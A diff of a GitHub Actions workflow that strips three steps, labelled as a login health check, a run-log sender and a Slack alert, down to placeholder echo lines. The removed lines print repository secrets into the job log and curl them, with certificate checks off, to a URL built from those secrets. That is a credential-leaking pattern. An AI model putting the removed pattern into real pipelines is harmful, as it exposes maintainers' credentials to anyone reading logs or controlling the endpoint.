@@ -21,8 +21,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $PW/$USER
+        echo "aaaa"
         
     - name: send_run_log
       continue-on-error: true
@@ -31,9 +30,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo "$USER"
-        echo "$PW"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $PW/$USER
+        echo "aaaa"
         
     - name: send_slack_alert
       continue-on-error: true
@@ -51,4 +48,4 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $PW/$USER
+       echo "aaa"
